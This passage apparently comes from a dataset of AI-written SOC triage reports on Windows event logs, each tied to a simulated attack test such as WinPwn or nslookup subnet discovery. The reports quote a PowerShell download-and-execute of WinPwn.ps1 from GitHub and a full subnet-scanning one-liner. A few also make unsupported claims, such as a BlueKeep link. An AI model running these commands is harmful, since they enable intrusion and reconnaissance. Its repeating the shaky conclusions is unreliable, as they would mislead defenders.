   - The Sysmon logs detail the execution of a PowerShell instance (`powershell.exe`) with the command line running a script from a URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This script appears to be downloading and executing code that could exploit the `BlueKeep` vulnerability.
   - The command line includes downloading a script from an external repository, which is a common method of executing potentially harmful scripts on a system.

4. **Strange Executables**:
   - `MicrosoftEdgeUpdate.exe` is executed in several instances. While it might be a legitimate process for updating Microsoft Edge, its execution after a PowerShell command that downloads external scripts raises a red flag. Additionally, there are multiple entries, suggesting potential misuse.

5. **User Account Activities**:
   - The `admin_test` account experiences considerable activity, including launching processes like `wevtutil.exe`, `conhost.exe`, which might be used to manipulate or review event logs strategically.

### Assessment

- The unauthorized time manipulation, the extent of privilege escalation, and the execution of external PowerShell scripts combined indicate a high likelihood of malicious activity occurring on this host.

### Resolution

**Resolution:** MALICIOUS

### Guidance

1. **Immediate Response**:
   - Isolate the affected machine from the network to prevent further spread of any potential compromise.
   - Perform a complete forensic analysis on the machine to identify all changes and potential backdoors.

2. **Incident Handling**:
   - Reset passwords and investigate other systems for similar indicators of compromise.
   - Review access logs and correlate with other activities for comprehensive scope determination.

3. **Preventive Measures**:
   - Apply patches addressing known vulnerabilities like BlueKeep.
   - Enhance monitoring with alerts for unusual activities such as time changes or excessive privilege usage.
   - Educate users on the risks of executing scripts from unverified sources.

The evidence suggests a coordinated effort possibly aimed at exploiting known vulnerabilities combined with privilege abuse, marking a clear alert for deeper investigation and intervention."
Process Discovery - tasklist,"Upon reviewing the provided Windows event logs, I have conducted a thorough analysis to identify any indicators of suspicious or malicious activity.

### System Log Analysis
- **Time Change**: There are events (EventID: 24 and 1) indicating a change in the system time using the `svchost.exe` process (a legitimate Windows service host process). The change in time from `2024-10-22 19:11:37` to `2024-10-22 19:11:08` is logged. This might have been triggered by a system process for legitimate reasons, such as time synchronization with an NTP server (`time.windows.com`). However, unauthorized time changes can sometimes be used by malicious actors to manipulate time-dependent actions or logs.
  
- **Time Source Chosen**: An event (EventID: 35) from the ""Microsoft-Windows-Time-Service"" indicates synchronization with a time source `time.windows.com`, which is typically normal behavior for timekeeping services.

### Sysmon Log Analysis
- **Common Tools**: Several common, benign processes are being executed such as `whoami.exe`, `cmd.exe`, `tasklist.exe`, and `hostname.exe`. These processes by themselves aren't suspicious but can be parts of enumeration activities if not justified by user actions.
  
- **Frequent Context Host and Command Line Executions**: The logs show multiple executions of `conhost.exe`, often associated with handling console windows, supporting command prompt instructions, or running shell commands. The context of these executions seem routine as they follow processes like `whoami.exe` and `tasklist.exe`.

- **Use of wevtutil.exe**: This tool is used to interact with Windows event logs. Multiple wevtutil.exe executions could hint at an investigation or audit by an admin, but frequent use without reason might need further investigation.

### Security Log Analysis
- **Time Change Confirmation**: The security log confirms the time change activities seen in the system logs, executed by `svchost.exe` under `LOCAL SERVICE`. It corresponds with what is noted in the System and Application logs.

### Application Log Analysis
- **Normal Software Protection Platform Service Entry**: The application logs show an expected `Microsoft-Windows-Security-SPP` event regarding the Software Protection Platform Service. No anomalies here.

### Conclusion & Assessment
- **BENIGN**: The activities logged appear to be normal system operations involving typical use of internal utilities and scheduled time synchronization actions. Given the context and the pattern of events, there aren't concrete indicators of compromise or malicious activities. The time change events could be a legitimate system or service-triggered action, and no additional context points to it being malicious.

### Guidance on How to Proceed
Continue to monitor the system for unexpected deviations or unusual patterns. Ensure all systems and software are fully patched and maintain a robust security monitoring strategy to promptly detect unusual behaviors. If behavior similar to this is observed again without a reasonable cause, conducting a deeper investigation into user actions alongside any network traffic might provide further clarity."
Applications Installed,"### Analysis of Logs

After analyzing the provided Windows event logs, here is a detailed explanation of the findings:

1. **System Log:**
   - The logs predominantly consist of time adjustments and kernel general operations such as the use of `svchost.exe` to update time.
   - The presence of `svchost.exe` as a running process is normal in Windows systems since it hosts Windows services. The time changes logged (`EventID 24` and `EventID 1`) appear to be consistent with time synchronization activities and don't inherently suggest malicious activity.

2. **Windows PowerShell Log:**
   - PowerShell is used to query the Windows registry for installed software, querying both 32-bit and 64-bit registry hives.
   - The command `Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*` is common for inventory purposes and does not show any direct malicious intent.
   - The systematic use of PowerShell commands documented as run from a known application (`powershell.exe`) that gathers system information is not typically malicious.

3. **Security Log:**
   - Changes in system time are logged, (EventID 4616) which correlate with the system logs, involve the `svchost.exe` process and reflect typical authoritative domain tasks.
   - The logs indicate that the updates are performed under the `LOCAL SERVICE` account, which is a part of standard time adjustment processes and is not indicative of unauthorized privilege escalation.

4. **Sysmon Log:**
   - The execution of common binaries such as `hostname.exe`, `whoami.exe`, `wevtutil.exe`, and others are recorded.
   - `whoami.exe` is used to check current user information, which by itself is not a sign of compromise unless combined with other suspicious activities.
   - The use of `wevtutil.exe` in multiple instances is notable but could be concurrent with administrative or logging activities, which in this context aren’t definitive of ill intent.
   - Various instances of process creation were recorded indicating system information gathering or log exports, and no anomalous or suspicious command lines or integrity issues were observed related to these processes.

### Conclusion

None of the activities observed in the provided logs are definitively malicious. They consist mainly of:

- Normal system time synchronization processes.
- PowerShell scripts enumerating installed applications, which is common for administrative or inventory tasks.
- Execution of well-known system utilities, congruent with script automation possibly tied to system maintenance.

### Recommendation

Given the evidence presented and lack of distinctly malicious indicators:

- **Resolution: BENIGN**

However, continued vigilance is recommended, particularly monitoring for unusual process behavior, unexpected privilege escalations, or network anomalies, which may augment the current findings if additional data emerges."
Enumerate Active Directory Computers with Get-AdComputer,"### Detailed Analysis of Windows Event Logs

Upon reviewing the provided log entries across various Windows logs, I will point out key findings and perform an assessment:

#### Application Log
- **Windows Defender Activation**: The log indicates that Windows Defender is turned on with the event ""SECURITY_PRODUCT_STATE_ON"". This shows that the system's built-in antivirus is active, which is generally a good indicator of baseline security posture.

#### System Log
- **Windows Update**: Multiple entries indicate that a security intelligence update for Microsoft Defender Antivirus (KB2267602) was being installed. This update seems to have been processed successfully. Routine updates like these are crucial for maintaining the security of the system.

#### Sysmon Log
- **Process Executions**: There are multiple entries of the execution of system processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `powershell.exe` by the user ""SERVER002\admin_test"". 
  - `wevtutil.exe` and `whoami.exe`: These tools are often used in system administration tasks. The usage might not necessarily indicate malicious activity unless correlated with suspicious timing or user accounts.
  - `powershell.exe`: A PowerShell execution involved a command to get Active Directory computers (`Get-AdComputer`), which can be benign or potentially suspicious depending on the context and the user's responsibilities.
- **Windows Update Processes**: There is evidence of processes `wuauclt.exe` and `AM_Delta.exe` running, which relate to Windows Update and AntiMalware Definition Update. These are standard operations for Windows update processes.

#### Security Log
- **Credential Validation Attempts (Event ID 5379)**: Several entries show credential validation attempts, which failed with a return code. These entries alone don't demonstrate clear malicious activity but could indicate credential verification attempts that warrant further attention if logon failures are persistent or from unusual access points.

#### Windows PowerShell Log
- **PowerShell Activity**: Several PowerShell sessions were started, with registry, alias, environment, and other providers being initialized. The PowerShell command of interest is `Get-AdComputer -Filter *`, which queries Active Directory for computers. This activity might be part of legitimate administrative scripts but necessitates further investigation regarding the user's intent and necessity.

### Assessment and Resolution
After reviewing all log sections, the overall activity does not display definitive signs of malicious activity but raises some points that need further attention:

- The execution of administrative tools like `whoami.exe` and `wevtutil.exe`, along with PowerShell commands intended to access Active Directory resources, should be reviewed with the context of regular user activities. If the ""SERVER002\admin_test"" account is authorized for such tasks, the actions are likely benign.
- The failed credential validity checks (Event ID 5379) should be further probed to ensure they do not correspond to unauthorized access attempts.

### Final Resolution: **SUSPICIOUS**
- While the logs show standard system and administrative activities, certain elements, like the AD query execution through PowerShell, invite verification to validate their legitimacy and ensure there isn't unauthorized usage or intent. Further context on the user activities and any repeated failures in credential checks should be cross-referenced against user access logs or alerts for potential policy breaches or unauthorized activities.

### Guidance
- Review the user's actions and validate the legitimacy of AD queries if they align with job functions.
- Monitor for repeated unusual credential validation failures, which might signal interest in unauthorized access attempts.
- If further uncommon patterns emerge, consider more comprehensive monitoring or initiate an internal review for potential policy violations."
Network Share Discovery command prompt,"After analyzing the provided Windows event logs from the specific machine, here is the detailed assessment:

1. **Application Log Analysis:**
    - The logs show multiple entries of the ""edgeupdate"" service starting and stopping, which is typically associated with automatic updates for the Microsoft Edge browser. These actions seem regular and do not indicate any malicious activity. The entry for ""Microsoft-Windows-Security-SPP"" also does not raise any particular red flags, as it involves Software Protection Platform Service operations.

2. **Sysmon Log Analysis:**
    - The logs contain multiple instances of process creation events related to common and expected system processes such as `wevtutil.exe`, `conhost.exe`, and `cmd.exe`. The Sysmon events capture process executions under the `SERVER002\admin_test` account, which seems to have high integrity levels, indicating elevated privileges.
    - The execution of `cmd.exe` with the command `net view \\localhost` in a high integrity context (`admin_test` account) could suggest an administrative script or a system check performed by an administrator. This by itself does not indicate malicious activity, but it depends on the intent behind executing such commands.
    - The presence of multiple Edge Update process events is expected if the Edge browser is undergoing updates.

3. **System Log Analysis:**
    - The logs highlight system activities like time changes managed by `svchost.exe`, but this alone does not imply malicious behavior. The time adjustments could be normal synchronization with an NTP server.

4. **Security Log Analysis:**
    - Security logs reflect successful logons for the `admin_test` user and the use of privileges typical for administrative operations, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. The presence of these privileges is expected for an admin user account and does not necessarily indicate malicious activity.
    - The `4624` logged indicates a successful logon event using the NTLM authentication protocol. The IP Address (`192.168.0.102`) and the Workstation (`DESKTOP-3HL5B2P`) from which the logon is made seems to be from within a private network, which often indicates internal activity.

**Assessment and Resolution:**
- The logs indicate regular and expected operations for system updates, administrative tasks, and user activities rather than definitive signs of malicious behavior. The `admin_test` account appears to be performing routine system checks and tasks.
  
**Resolution: BENIGN**

However, if there are concerns about this administrative activity or this user account is not recognized as legitimate, a deeper analysis or follow-up might be necessary, but based solely on these logs, no malicious activity is identified."
System Information Discovery (2),"Upon detailed review of the Windows event logs provided, the following observations and analysis can be made:

### Observations:

1. **Sysmon Logs:**
   - There are frequent event execution logs (EventID 1) related to command-line operations such as `cmd.exe`, `wevtutil.exe`, `whoami.exe`, and `powershell.exe`. 
   - The command line operations recorded include querying system configurations (`wevtutil`, `gpresult`, `cmd.exe` with various parameters) and networking configurations (`netsh`, `ping`).
   - There is evidence of PowerShell scripts being executed that perform comprehensive network diagnostics and system configuration checks, and logs being created in `config\` directories.

2. **System Logs:**
   - Clock synchronization activities are recorded, where `svchost.exe` is involved in time adjustments. There are no immediate suspicious activities observed from these logs.

3. **Security Logs:**
   - Multiple logon sessions and privilege use logs for `admin_test` user and SYSTEM are noted, which seem typical for administrative activities.
   - Privilege escalation events (EventID 4672) are recorded for SYSTEM and admin users, indicating administrative-level activities.

4. **Windows PowerShell Logs:**
   - A significant PowerShell session captures network adapter details, pings to external services (i.e., `bing.com`), and numerous system configurations, storing them in network configuration logs.

5. **Application Logs:**
   - Routine logs related to service activities such as `Security-SPP` and `edgeupdate` service stopped messages.

### Assessment:

- **Unusual Execution and Data Collection:**
  - The execution of several command-line operations and PowerShell scripts that collate detailed system configuration and network diagnostic data (`netsh`, `PowerShell network commands`) is notable.
  - The activities involve exporting sensitive configuration settings, query related to system services, network settings, and an apparent structured data-gathering process with outputs written to disk. This behavior can be typically seen in both regular system audits and potential reconnaissance activities.

- **Potential Signs of Network and System Information Disclosure:**
  - The `PowerShell` script executed appears to conduct extensive information gathering concerning network configurations and interfaces. This level of detail for logging and querying indicates a level of introspection that could be indicative of a security audit, a configuration check, or a reconnaissance operation by an insider.

- **Authenticated and Elevated Activities:**
  - The consistent use of admin privileges for executing various scripts and the network/system information collection further suggests these actions were either part of a planned system inspection/cleanup task or potentially a security event by a user with legitimate access.

### Conclusion:

Based on the logs provided, the activities appear slightly out of the ordinary in terms of typical user operations because of the extensive information-gathering involved and the administrative actions seen. While no direct evidence of malicious intent (such as known malware signatures, anomalous remote connections, or data exfiltrations) is evident, the behavior pattern exhibited might align with preparatory stages for malicious intent or could alternatively be symptomatic of legitimate administrative scripting for system diagnostics.

Therefore, the resolution is marked as:
- **SUSPICIOUS**, owing to the detailed and intentional data collection activities requiring verification to ensure this was not unauthorized information disclosure. Further investigation is recommended to ascertain the legitimacy and purpose of these operations."
WinPwn - Dotnetsearch,"### Analysis of the Windows Event Logs:

#### Application Log:

- **Windows Defender**: Logs indicate that Windows Defender is active and operational (`SECURITY_PRODUCT_STATE_ON`), which suggests appropriate basic security measures are in place.
  
- **Software Protection Platform Service**: Events related to the Software Protection Platform Service (`sppsvc`) are routine system events that do not typically indicate compromise.

- **Edge Update Service**: Two service stop events from the `edgeupdate` service are seen, which is not inherently malicious as services may stop and restart under normal circumstances (for example, due to updates).

#### System Log:

- **Kernel Events**: Kernel-General event logs primarily show routine operations such as time updates, which appear to be in response to network time sources. There is nothing suspicious in these changes as they align with time-synchronized activities.

- **Time Service**: The Time-Service event indicates that time synchronization is occurring correctly with standard NTP sources, e.g., `time.windows.com`.

#### Security Log:

- **Security Auditing**: The `Security-Auditing` events observed relate to time-change events, which align with the time-synchronization logs. No anomalies in user actions are detected, and the `svchost.exe` running under the `LOCAL SERVICE` account is standard.

#### Windows PowerShell Log:

- **PowerShell Activity**: The logs indicate an execution of PowerShell scripts via a command that fetches content from a remote repository using `iex` (Invoke-Expression), downloading and executing a script named `WinPwn.ps1` from a GitHub repository. This is a significant indicator of potentially malicious or unauthorized activity, as it suggests the execution of external scripts that could carry malicious payloads.

#### Sysmon Log:

- **Process Creation**: Among typical system processes (`wevtutil.exe`, `conhost.exe`, etc.), there’s a Process Creation event for `powershell.exe` with a command fetching scripts from a GitHub repository. This corresponds with the PowerShell log and strongly suggests suspicious behavior.
  
- **Edge Update Activity**: The logs show multiple instances of processes related to `MicrosoftEdgeUpdate`, consistent with legitimate update activities by the Microsoft Edge browser software. Each process is running under `NT AUTHORITY\SYSTEM`, which matches the standard behavior for update-related processes.

### Assessment Summary:

The primary point of concern is the PowerShell execution that involves unexpected network activity to download and execute a script from the internet, specifically from a GitHub repository. This action is atypical and often associated with malicious actions, such as a potential exploitation framework or unauthorized script execution.

### Resolution:

**Resolution: MALICIOUS**

### Recommendation:

1. **Immediate Attention**: Initiate an incident response procedure given the execution of suspicious PowerShell commands from an external source.
   
2. **Isolate the Host**: Temporarily isolate the machine (Server002) from the network to prevent any potential spread of malicious activity.

3. **In-depth Analysis**: Conduct a deeper forensic analysis to determine the full impact and origin of the unauthorized script execution and other potential malicious activities.

4. **Review Security Policies**: Review and tighten security policies related to PowerShell execution, especially any execution policy allowing the download and running of scripts from internet sources.

5. **User Awareness Training**: Ensure that users are aware of security policies around script execution and the risks of executing scripts from unsanctioned external sources."
Display group policy information via gpresult,"Based on the provided logs, we will assess for indicators of potential compromise or unusual behavior. Here's a detailed breakdown of each log:

### Application Log
- **edgeupdate**: The log shows a service stop for edgeupdate with no concerning details. Service starts and stops are common during regular updates.
- **Software Protection Platform Service**: Normal logging event indicating a regular check from SPP. Nothing unusual.

### Security Log
- **EventID 4616**: Indicates a system time change by LOCAL SERVICE within a very short period. While time changes can be legitimate, they could also be indicative of attempts to manipulate logs or timestamps. However, without additional context, it is difficult to determine if this was malicious.

### Sysmon Log
- **whoami.exe & hostname.exe**: Execution of `whoami.exe` and `hostname.exe` by a user (`admin_test`) with high integrity level seems benign as it's common for users or administrators to gather system information.
- **wevtutil.exe and conhost.exe**: These processes appear to be child processes of legitimate parent processes (`whoami.exe` and others) and used by `admin_test`. The usage seems consistent with a user exploring system settings.
- **EdgeUpdate Activity**: Significant activity involving `MicrosoftEdgeUpdate.exe` is visible, with the service registering and updating. All activities seem related to automated update processes, generally benign if verified as legitimate.
- **WmiPrvSE.exe**: The WMI provider host process started under `Local Service`. Though it can sometimes be misused for persistence or lateral movement, the process itself is legitimate.

### System Log
- **Time Change Events**: Reflects time adjustments synchronized with external time sources (`time.windows.com`). This can be suspect if abused for hiding activities, but logs show normal synchronization.

### Windows PowerShell Log
- Absent from logs, no suspicious PowerShell activities are recorded.

### Assessment

#### Threats/Risks Identified
- **Time Changes**: Repeated system time changes by `svchost.exe` within seconds could seem suspicious, but current context and typicality of such events in benign scenarios cannot precisely qualify them as threats.

- **Update Logs**: Predominantly show normal operations if `MicrosoftEdgeUpdate` and Edge processes are verified to align with standard update signatures and timestamps.

### Conclusion

1. **Time Change Activities**: Potential suspicion exists; however, it needs more context regarding priviledged accounts using `svchost` for frequent time changes.
   
2. **EdgeUpdate**: Activity matches patterns of software update behavior; without additional unusual command-line arguments or erratic behavior, it seems benign.

Overall, the logs predominantly indicate normal update and information-gathering activities with some minor time change suspicions that lack context to be definitively called malicious.

### Final Resolution:
- **SUSPICIOUS** - Due to minor suspicion regarding repeated time changes, further investigation for potential time manipulation should be pursued while confirming the legitimacy of `edgeupdate` activities."
Query Registry,"**Detailed Analysis:**

Upon examining the provided Sysmon, Security, Application, and System logs, there are several observations:

1. **Sysmon Logs:**
   - A series of commands executed using `cmd.exe` related to Windows Registry queries are found. These `reg.exe` commands query a wide range of registry keys commonly used to configure startup applications and other system behaviors. Such extensive querying of registry keys can be indicative of reconnaissance activities often associated with malicious behavior. These queries are executed by the `admin_test` user.

2. **Process Execution:**
   - The `admin_test` user is initiating several processes, including `conhost.exe` and `wevtutil.exe`, which are normal system utilities but may also be used in conjunction with Sysmon event collection or potentially malicious actions like log clearing. However, there is no evidence of log tampering itself in the provided logs.

3. **Security Logs:**
   - The recurring Event ID 5379 indicates unsuccessful attempts to access credentials associated with the `MicrosoftAccount:user=02txoixylodcstop`. This could suggest attempted unauthorized access or an issue with credential retrieval attempts but does not definitively indicate malicious activity without further context.

4. **Windows Update Events:**
   - Processes related to Microsoft updates and antivirus signatures show standard update activity, which is a benign behavior.

5. **User Privileges:**
   - The `admin_test` user executes processes with high integrity level, indicating the potential for elevated privileges, which is critical if the user was performing unwanted actions. However, no privilege escalation events are clearly logged.

**Assessment:**
- The command-line behavior with multiple registry queries is suspicious. Such behavior could indicate a script running to gather startup programs, possibly for persistence or information gathering. The specific use of commands, such as queries to `HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit`, could also indicate an attempt to identify or manipulate startup sequences typically targeted by malware.
- While some processes (e.g., `conhost.exe` related to interactive terminal sessions) appear frequently, they do not by themselves constitute malicious activity without clearer indicators of misuse.

**Resolution:**
Based on the suspicious behavior observed, particularly the registry querying activities, further investigation is warranted to understand the context and intent behind these actions.

- **Resolution:** SUSPICIOUS

**Guidance on How to Proceed:**
1. Conduct further investigations on the `admin_test` account’s activities, including checking user actions around the time frame of these log events.
2. Review other logs, if available, such as PowerShell or network logs, for any outbound connections that might correlate with the time of the suspicious registry activity.
3. Analyze historical events to determine if similar activity has been observed before, which might indicate a pattern.
4. Run endpoint detection tool(s) to check for any known threats related to the observed CMD/PowerShell commands transaction.
5. Ensure that alerts are set up for similar events to capture any future suspicious behavior swiftly.

By taking these steps, you can better ascertain whether these activities were benign administrative actions or indicative of a more significant threat."
Environment variables discovery on windows,"## Detailed Analysis of Windows Event Logs

### Overview
The provided logs span several types of Windows events, including System, Application, Security, and Sysmon logs on the computer `Server002`. The events range within a very short timeframe on `2024-10-23`. 

### Potential Red Flags in the Logs

#### 1. Time Manipulation
Some events in the logs indicate changes in system time:
- **Kernel-General Event (EventID 1):** Indicates an adjustment in time from `OldTime: 2024-10-23 17:38:47.7413819` to `NewTime: 2024-10-23 17:38:43.4221953` by the `svchost.exe` process. Time changes can be indicative of attempts to bypass logging, execute time-sensitive attacks, or tamper with system event sequences.

#### 2. Privilege Escalation
- **Security Log EventID 4672:** The user `admin_test` was assigned high-level privileges, including many that are often associated with administrative operations (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`). While `admin_test` appears to be a legitimate user, unexpected elevation of privileges with no context can be suspicious.
- **Security Log EventID 4624:** There were successful logon events using NTLM authentication from `DESKTOP-3HL5B2P` with a high integrity level which includes elevated tokens.

#### 3. Usage of Administrative Utilities
- **Sysmon EventID 1 & 5:** Execution of several utilities (`whoami.exe`, `cmd.exe`, `wevtutil.exe`) by `admin_test`, which may be legitimate troubleshooting or administrative tasks. The context, such as running `whoami.exe` to check user context or `cmd.exe` with the `/c set` command, suggests checking the environment. However, the absence of logs providing legitimate reasons for these activities or documentation on why the user executed these can merit further investigation.

#### 4. Use of Background Services and Known Legitimate Processes
- **Sysmon Log:** Processes like `sppsvc.exe` (Software Protection Platform Service) and `TrustedInstaller.exe` were seen running, which are legitimate. 

### Contextual Analysis
- **No Clear Malicious Intent:** While the logs indicate time changes and privilege escalations, which can be suspicious, they lack contextual drive to concluding malicious activities without more detailed logs or other supporting databases indicating compromise or correlation with an active security incident.
- **Normal Administrative Tasks:** Using `wevtutil.exe`, `whoami.exe`, and `cmd.exe` can also be a part of routine administrative work or troubleshooting, especially if managed by a legitimate user account like `admin_test`.

### Assessment and Guidance

- **Resolution:** **SUSPICIOUS**
  - The activities logged are somewhat suspicious, particularly the time change and privilege escalation which should be checked against network security policy occurrences.
  - The logs should be correlated with more system activity data to discern legitimate administrative operations from potentially anomalous or unauthorized ones.
  - **Further Action:** Conduct a follow-up audit on user `admin_test`’s activity within policy context. Check for explanations within ticketing systems for these operations or any active directory logs granting permissions temporarily.
  - **Recommendations:** Ensure the sync settings and policy configurations that log time changes are optimally set, reducing the window of unsupervised time manipulations."
Enumerate Root Domain linked policies Discovery,"### Detailed Analysis of the Logs:

#### 1. Security Logs:
- **Event ID 4616** indicates the change of system time. Two entries show `svchost.exe` (common Windows process) altering the time. This can be legitimate but can also be indicative of attacker activity to obfuscate their traces.

#### 2. Windows PowerShell Logs:
- The entries show multiple PowerShell provider events (Registry, Alias, Environment, FileSystem, Function, Variable) being started.
- The `HostApplication` and `CommandLine` contain a script that accesses Active Directory Group Policy Link attributes. The script's command pattern is often seen in network reconnaissance activities performed by attackers to extract domain information, thus appearing suspicious.

#### 3. Application Logs:
- Entries in the Application log mainly show activities of the EdgeUpdate service and Software Protection Platform, which are legitimate system services. The stopping of the EdgeUpdate service may tie into regular system operations, as other log entries reflect Edge update tasks.

#### 4. Sysmon Logs:
- Several events involve typical Windows processes like `wevtutil.exe`, `conhost.exe`,  and `hostname.exe`, but without clear malicious intent.
- Of particular note is a PowerShell execution (`powershell.exe`) with a command that uses ADSI (Active Directory Services Interface) to query Group Policy links, reflecting the same behavior noticed in PowerShell logs and is generally suspicious.
- Most activities are related to Microsoft EdgeUpdate, displaying updates and registrations which are benign if appropriately scheduled updates occurred.
 
#### 5. System Logs:
- Repeated entries related to system time changes corroborate security log entries but don't immediately indicate malicious activity unless found with other suspicious activities.

### Assessment:
- The combination of PowerShell activities querying Active Directory attributes along with time changes could suggest reconnaissance operations common in early stages of a cyber intrusion.
- The specific PowerShell command used shows potential red flags consistent with domain reconnaissance.

### Resolution:
- **SUSPICIOUS** - The logs contain atypical and potentially reconnaissance-related PowerShell activity that requires further investigation to conclusively ascertain its intent and context, as it may be reflective of a compromise or penetration testing overlooked.

### Next Steps:
1. **Investigate User Activity**: Check if `SERVER002\admin_test` was involved in regular tasks and identify any deviations.
2. **Contextualize PowerShell Commands**: Review script content and intent with system users or admins to validate whether the tasks were sanctioned.
3. **Correlate with Other Systems**: Check network traffic logs and other hosts for synchronous actions that could corroborate reconnaissance or intrusion.
4. **Endpoint Security Validation**: Ensure endpoint protection and monitoring are operational and run a deep scan for potential threats.
5. **Implementation of Time Sync Alerts**: Set up monitoring and alerts for time changes, especially from privileged services like `svchost.exe`.

A more extensive investigation may reveal legitimate background activities aligned with corporate policies or could identify further malicious markers."
Enumerate Linked Policies In ADSISearcher Discovery,"### Detailed Analysis of Windows Event Logs

#### Security Logs
- **Event ID 4616:** This event indicates a change in system time. The log shows two time changes back-to-back for the process `C:\Windows\System32\svchost.exe`. Frequent or unexplained changes to the system time could be indicative of an attempt to bypass security controls or timestamp evasion, which can signal malicious behavior. However, system time adjustments are also common under legitimate circumstances.

#### Sysmon Logs
- **Process Creation Events (Event ID 1):** Multiple legitimate Windows processes are being executed by the user `SERVER002\\admin_test`, including `whoami.exe`, `powershell.exe`, and `hostname.exe`. While the execution of these commands could be normal, `whoami.exe` and `powershell.exe` execution could raise suspicion if unexpected or not typical for the user.
  
- **Process Termination/End (Event ID 5):** Regular process execution like `wevtutil.exe` and `conhost.exe` suggest that administrative tasks or service management activities are taking place. The frequent invocation of `wevtutil.exe` could be tied to log query or export actions and may warrant further investigation if not expected.

- **PowerShell Usage:** The PowerShell script executed is notable due to its complexity and depth of querying Organizational Units (OUs). It employs Active Directory searcher and filters Group Policies linked to OUs. Such scripts are often used for administrative tasks but could also be leveraged for reconnaissance by a malicious actor.

#### PowerShell Logs
- **Event ID 600:** Indicates the starting of various providers like Registry and Alias, mainly related to PowerShell sessions. The script executed is identical to what is captured in Sysmon logs, focusing on AD OU paths and linked Group Policies. If not accustomed or typical for the environment, this could indicate suspicious reconnaissance activity.

#### System Logs
- **System Time Change (Event ID 1):** This is captured here as well, matching details from the security logs.

#### Application Logs
- Events related to Microsoft Edge Update seem routine, involving service starts and stops as part of the update process.

### Assessment
Upon detailed examination, the logs present various legitimate Windows activities, such as process executions for system procedures, regular administrative tasks, and updates for Microsoft Edge. However, certain activities raise flags for further scrutiny, specifically regarding the frequent execution and use of PowerShell and time changes:
- **PowerShell Activity:** The PowerShell script querying AD OUs and GPOs could represent typical administrative tasks but also suspicious reconnaissance if unauthorized or unexpected.
- **System Time Modification:** System time changes are documented but not explained and may warrant further examination to ensure these align with normal maintenance or administrative tasks.

### Conclusion: **SUSPICIOUS**
While many events appear routine, activities around PowerShell scripts and system time modifications warrant further investigation to confirm they are not malicious. Recommended next steps include verifying these actions with known administrative schedules or personnel, reviewing account usage and permissions for the user `admin_test`, and confirming that the system time changes were authorized and logged by legitimate tasks or processes."
Remote System Discovery - nslookup,"Upon reviewing the provided Windows event logs from Server002, several points of interest and potentially suspicious activities were noticed:

**1. System and Software Updates:**
- The Windows host appears to have undergone routine updates, such as the ""Security Intelligence Update for Microsoft Defender Antivirus"" which is typical and expected behavior.

**2. Sysmon Logs - Process Executions:**
- There is repeated execution of common Windows utilities such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, `ipconfig.exe`, and `nslookup.exe`. While their presence isn't abnormal in itself, the context and execution frequency of these processes require attention.
- Notably, `nslookup.exe` is repeatedly executed in a sequence initiated by PowerShell, scanning over a range of IP addresses by using a loop that iterates over possible endpoints in the local network address space (192.168.x.x).

**3. PowerShell Activity:**
- A notable PowerShell script executes repeatedly with the command pattern: 
  ```
  powershell.exe & {$localip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1], $pieces = $localip.split("".""), $firstOctet = $pieces[0], $secondOctet = $pieces[1], $thirdOctet = $pieces[2], foreach ($ip in 1..255 | % { ""$firstOctet.$secondOctet.$thirdOctet.$_"" } ) {cmd.exe /c nslookup $ip}}
  ```
  This script is performing a network scan by enumerating IP addresses across the local subnet. Such actions can be a reconnaissance activity aiming to gather intelligence about the network and potential hosts.

**4. Security Log Entries:**
- Security logs show logon events using NTLM authentication. There is elevation of privileges for the user `admin_test` evidenced by granted privileges typical for administrative activity. The events do not provide clear evidence of illegitimate use but should be reviewed in conjunction with other suspicious activities.

**Assessment:**

- The cyclic execution of PowerShell scripts to scan a subnet is sufficiently anomalous, suggesting a reconnaissance activity that potentially indicates a malicious intent or compromise.
- The fact that the script employs `nslookup.exe` for network exploration is noteworthy, as it suggests a scripted and automated means to probe the network, which is typical in the early stages of an attack vector.

**Resolution: SUSPICIOUS**  
Although there is no definitive proof of compromise, these logs contain activities warranting further investigation, especially concerning the PowerShell script activity which resembles reconnaissance—an indicator of potential compromise or malicious activity. Actions should be taken to isolate and examine this host in-depth to determine the intent and origin of these activities. Additional actions may include monitoring network traffic for unusual patterns, inspecting user behavior, and reinforcing security measures across the network."
Security Software Discovery,"After analyzing the provided Windows event logs across different categories, here are the detailed findings:

1. **System Log**:
   - The logs capture regular system time adjustments using `svchost.exe`, which can be a regular system operation for synchronizing time. There is no indication of any abnormal activity in these logs.

2. **Windows PowerShell Log**:
   - Multiple PowerShell commands are executed to check processes and services related to Sysmon and other systems services (like 'Get-Process', 'Get-Service', and 'Get-CimInstance'). These operations appear to focus on auditing or monitoring services, which can be inline with security or administrative tasks.
   - There is no direct sign of malicious activity as these might be part of routine administrative scripts or monitoring tools checking for the presence of specific processes or services.

3. **Application Log**:
   - The logs mainly involve updates and stop events from `edgeupdate` and `sppsvc.exe`. These processes are typically related to Microsoft Edge updates and the Software Protection Platform and don't indicate any malicious actions unless they are executed in an unusual context, which is not evident here.

4. **Sysmon Log**:
   - Extensive command-line activity is seen using `cmd.exe`, querying firewall configurations, and checking running tasks and services with keywords like 'virus', 'defender', 'sysm', etc. This activity could be interpreted as either system audit tasks or potential reconnaissance by an attacker.
   - Although such queries could highlight suspicious behavior if run outside of regular administrative tasks, they do not conclusively indicate malicious activity without additional context.

5. **Security Log**:
   - These logs indicate regular time changes logged by `svchost.exe`, typical of system adjustments. There do not seem to be any elevation of privileges or suspicious logon events directly indicated in the logs provided.

**Assessment**:
- The pattern of PowerShell activities and command-line queries, while extensive, resemble administrative or audit-like behavior often associated with actions performed during routine checks or system assessments.
- Despite the high level of activity, there is no concrete evidence of harmful intent, such as attempted privilege escalation, unauthorized access by unknown accounts, or execution of known malicious binaries.

**Resolution: SUSPICIOUS**
- The logs indicate patterns that could be part of a legitimate administrative or review task, but the specifics (like command details and timing) warrant further scrutiny to ensure these actions align with known and authorized activities. Additional context around these operations, including verifying the users running these processes and cross-referencing against known schedules for audits or maintenance, will help eliminate any remaining concerns.
"
